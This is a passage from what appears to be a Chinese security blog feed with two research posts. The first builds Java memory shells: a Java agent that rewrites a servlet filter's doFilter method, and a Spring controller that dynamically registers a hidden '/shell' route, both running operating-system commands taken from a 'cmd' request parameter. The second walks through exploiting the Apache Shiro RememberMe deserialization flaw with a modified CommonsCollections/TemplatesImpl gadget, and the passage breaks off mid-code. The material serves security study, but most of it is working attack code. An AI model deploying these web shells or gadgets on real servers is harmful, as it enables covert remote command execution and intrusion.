class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br> <br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br> <br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br> <br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Inject_Agent_Spring类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.inject;<br> <br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br> <br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Agent_Spring</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br> <br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;<br> <br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br><span class="hljs-comment">//            System.out.println(vmd.displayName());</span><br> <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动一个简单的Spring Boot项目</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302140102824.png" alt="image-20240302140102824"> </p><p>运行<code>Inject_Agent_Spring</code>类，在doFilter方法中注入恶意代码，成功执行</p><h2 id="Spring内存马"><a href="#Spring内存马" class="headerlink" title="Spring内存马"></a>Spring内存马</h2><p>首先我们要分析controller是如何进行注册的</p><h3 id="Controller的注册"><a href="#Controller的注册" class="headerlink" title="Controller的注册"></a>Controller的注册</h3><p>我们直接跟进DispatcherServlet里面查看</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231026185754515.png" alt="image-20231026185754515"> </p><p>发现mappedHandler是来自于getHandler的</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231026185823088.png" alt="image-20231026185823088"> </p><p>进入getHandler方法</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231026185941173.png" alt="image-20231026185941173"> </p><p>我们发现他是将这些页面进行一个遍历并获取其中的handler，可以看到这些mappings就是我们想要的页面，我们跟进gethandler方法</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231026194234267.png" alt="image-20231026194234267"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231026194521931.png" alt="image-20231026194521931"> </p><p>接着往下深入，这里有一个lookupHandlerMethod</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231028095511491.png" alt="image-20231028095511491"> </p><p><img src="D:\mdimage\image-20231028095611066.png" alt="image-20231028095611066"> </p><p>跟到这里我们发现了这里找到了我们路径映射的地方，而且再往下看我们可以看到有一个关于mapping的抽象类</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231028100424945.png" alt="image-20231028100424945"> </p><p>在这个抽象类的registerMapping方法中，我们找到了具体进行注册的地方</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231028100546441.png" alt="image-20231028100546441"> </p><p>也就是说模拟注册向mappingRegistry中添加内存马路由，就能注入内存马。</p><p>在AbstractHandlerMethodMapping中就提供了registerMapping添加路由。但是该类为抽象类。它的子类RequestMappingHandlerMapping能进行实例化</p><h3 id="RequestMappingHandlerMapping分析"><a href="#RequestMappingHandlerMapping分析" class="headerlink" title="RequestMappingHandlerMapping分析"></a>RequestMappingHandlerMapping分析</h3><p>接下来我们对刚才进入的这个类进行分析，我们看到了两个熟悉的小伙伴，这里的beanName也就是我们的controller，这里对每一个bean进行了判断</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231028101154487.png" alt="image-20231028101154487">  </p><p><img src="D:\mdimage\image-20231028101219042.png" alt="image-20231028101219042"> </p><p>当他是controller的时候，就会进入我们的detectHandler方法</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231115201925574.png" alt="image-20231115201925574"> </p><p>在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo，处理完后用registryHandlerMethod建立方法到RequestyMappingInfo的映射。也就是注册路由</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231115202143338.png" alt="image-20231115202143338"> </p><h3 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h3><p>spring中获取context的方式一般有以下几种</p><p>①直接通过ContextLoader获取，不用再经过servletContext。不过ContextLoader一般会被ban</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext();<br></code></pre></td></tr></table></figure><p>②通过RequestContextHolder获取request，然后获取servletRequest后通过RequestContextUtils得到WebApplicationContext</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">WebApplicationContext context = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextUtils</span>.</span></span>get<span class="hljs-constructor">WebApplicationContext(((ServletRequestAttributes)</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextHolder</span>.</span></span>current<span class="hljs-constructor">RequestAttributes()</span>).get<span class="hljs-constructor">Request()</span>);<br></code></pre></td></tr></table></figure><p>③用RequestContextHolder直接从键值org.springframework.web.servlet.DispatcherServlet.CONTEXT中获取Context</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">WebApplicationContext context = (WebApplicationContext)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RequestContextHolder</span>.</span></span>current<span class="hljs-constructor">RequestAttributes()</span>.get<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, 0)</span>;<br></code></pre></td></tr></table></figure><p>④直接反射获取WebApplicationContext</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">java.lang.reflect.Field filed = Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br>filed.setAccessible(<span class="hljs-literal">true</span>);<br>org.springframework.web.<span class="hljs-keyword">context</span>.WebApplicationContext <span class="hljs-keyword">context</span> =(org.springframework.web.<span class="hljs-keyword">context</span>.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-keyword">null</span>)).iterator().<span class="hljs-keyword">next</span>();<br></code></pre></td></tr></table></figure><p>实际上常用的就2,3。</p><p>其中1获取的是Root WebApplicationContext，2，3通过RequestContextUtils获取的是叫dispatcherServlet-servlet的Child WebApplicationContext。</p><blockquote><p>在有些Spring 应用逻辑比较简单的情况下，可能没有配置 <code>ContextLoaderListener</code> 、也没有类似 <code>applicationContext.xml</code> 的全局配置文件，只有简单的 <code>servlet</code> 配置文件，这时候通过1方法是获取不到<code>Root WebApplicationContext</code>的。</p></blockquote><h3 id="实现恶意Controller"><a href="#实现恶意Controller" class="headerlink" title="实现恶意Controller"></a>实现恶意Controller</h3><p>Spring Controller 的动态注册，就是对 <code>RequestMappingHandlerMapping</code> 注入的过程。</p><p><code>RequestMappingHandlerMapping</code>是springMVC里面的核心Bean，spring把我们的controller解析成<code>RequestMappingInfo</code>对象，然后再注册进<code>RequestMappingHandlerMapping</code>中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。</p><p>恶意类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shell.controller;<br> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_controller</span> &#123;<br> <br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;<br> <br>        <span class="hljs-comment">//获取当前上下文环境</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br> <br>        <span class="hljs-comment">//手动注册Controller</span><br>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>);<br>        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);<br> <br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br> <br>            <span class="hljs-comment">//获取request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImpl在Shiro中的利用</title>
    <link href="/decemberus.com/2023/04/07/TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E8%A1%A5%E5%85%85/"/>
    <url>/decemberus.com/2023/04/07/TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E8%A1%A5%E5%85%85/</url>
    
    <content type="html"><![CDATA[<h1 id="TemplatesImpl在Shiro中的利用"><a href="#TemplatesImpl在Shiro中的利用" class="headerlink" title="TemplatesImpl在Shiro中的利用"></a>TemplatesImpl在Shiro中的利用</h1><h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><p>在这里会出现BurpSuite的8080端口和Tomcat的8080端口重复的问题，解决方法是修改tomcat中的启动端口为8081</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402160605623.png" alt="image-20230402160605623"> </p><p>这样以后我们添加rememberme到cookie中，也就是直接在cookie字段后面直接添加</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402162131030.png" alt="image-20230402162131030"> </p><p>但发现这样他压根没有请求成功，我猜测是因为Cookie前面那两个字段碍事，去掉以后发现就可以了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402161943323.png" alt="image-20230402161943323"> </p><p>但他并没有按照我们的构想弹出来一个计算器，相反tomcat服务器报错了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402162429893.png" alt="image-20230402162429893"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402162449396.png" alt="image-20230402162449396"> </p><p><img src="D:/mdimage/image-20230402162455195.png" alt="image-20230402162455195"> </p><p>我们找到报错的最后一行，也就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:<span class="hljs-number">53</span>)<br></code></pre></td></tr></table></figure><p>点进去查看他的源码，发现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.shiro.io;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ClassUtils;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.UnknownClassException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassResolvingObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ClassResolvingObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(inputStream);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> ClassUtils.forName(osc.getName());<br>        &#125; <span class="hljs-keyword">catch</span> (UnknownClassException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(<span class="hljs-string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="hljs-string">&quot;]: &quot;</span>, var3);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>resolveClass 是反序列化中用来查找类的方法，简单来说，读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的 java.lang.Class 对象。</p><p>对比一下它的父类，也就是正常的 ObjectInputStream 类中的 resolveClass 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> Class.forName(name, <span class="hljs-literal">false</span>, latestUserDefinedLoader());<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException ex) &#123;<br>        Class&lt;?&gt; cl = primClasses.get(name);<br>        <span class="hljs-keyword">if</span> (cl != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> cl;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>区别就是前者用的是 <code>org.apache.shiro.util.ClassUtils#forName</code> （实际上内部用到了<code>org.apache.catalina.loader.ParallelWebappClassLoader#loadClass</code> ），而后者用的是Java原生的 <code>Class.forName</code> </p><p>我们在捕获异常的地方下断点，看看究竟是哪里除了问题</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402163721606.png" alt="image-20230402163721606"> </p><p>注意，此时tomcat服务器要改为在调试模式下运行</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402163745840.png" alt="image-20230402163745840"> </p><p>此时再次用burpSuite发起请求，将osc,getname添加到监视中，我们可以看到出现异常的类</p><p>可见，出异常时加载的类名为 <code>[Lorg.apache.commons.collections.Transformer;</code> 。这个类名看起来怪，其实就是表示 <code>org.apache.commons.collections.Transformer</code> 的数组。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230402164145830.png" alt="image-20230402164145830"> </p><p>这时候能浅浅的得出，ClassforName支持加载数组，而ClassLoader.loadClass不支持加载数组</p><p>深入的作用机理可以参考这两篇文章</p><p><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p><p><a href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/">http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/</a></p><p>直接得出结论，如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><p>所以我们需要构建不含有Transformer数组的payload</p><h2 id="构建不含数组的反序列化Gadget"><a href="#构建不含数组的反序列化Gadget" class="headerlink" title="构建不含数组的反序列化Gadget"></a>构建不含数组的反序列化Gadget</h2><p>使用Templates加载任意的Java字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;<span class="hljs-string">&quot;...bytescode&quot;</span>&#125;);<br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>obj.newTransformer();<br></code></pre></td></tr></table></figure><p>利用 <code>InvokerTransformer</code> 调用 <code>TemplatesImpl#newTransformer</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>但是在CC6中，我们用到了一个类，TiedMapEntry，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。 TiedMapEntry 类有个 getValue 方法，调用了map的get方法，并传入key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>当这个map是LazyMap时，其get方法就是触发transform的关键点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-comment">// create value for key if key is not currently in the map</span><br><span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>map.put(key, value);<br><span class="hljs-keyword">return</span> value;<br>&#125;<br><span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过<code>ConstantTransformer</code>来初始化恶意对象。</p><p>但是此时我们无法使用<code>Transformer</code>数组了，也就不能再用<code>ConstantTransformer</code>了。此时我们却惊奇的发现，这个 LazyMap#get 的参数key，会被传进<code>transform()</code>，实际上它可以扮演<code>ConstantTransformer</code>的角色——一个简单的对象传递者。</p><p>那么我们再回看前面的Transform数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>new ConstantTransformer(obj) 这一步完全是可以去除了，数组长度变成1，那么数组也就不需要了。</p><p>这个过程其实挺巧的，而且和前面几篇文章中的知识紧密结合。如果你发现这一节有点难懂，那么一定是没有理解Transform数组运行的原理，和CommonsCollections6的原理，回去再看看就好了。</p><h2 id="将CC6改造为CCShiro"><a href="#将CC6改造为CCShiro" class="headerlink" title="将CC6改造为CCShiro"></a>将CC6改造为CCShiro</h2><p>首先还是创建 TemplatesImpl 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 